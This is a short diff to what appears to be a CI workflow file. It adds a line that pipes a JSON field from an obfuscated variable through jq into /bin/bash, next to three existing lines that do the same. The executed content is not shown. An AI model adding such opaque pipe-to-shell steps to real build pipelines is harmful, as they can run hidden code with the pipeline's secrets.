@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
           echo $tkhf5 | jq -r .q701 | /bin/bash
           printf '%s' "$lji52" | jq -r .z81164 | /bin/bash
+          echo $x56120 | jq -r .rodd0 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
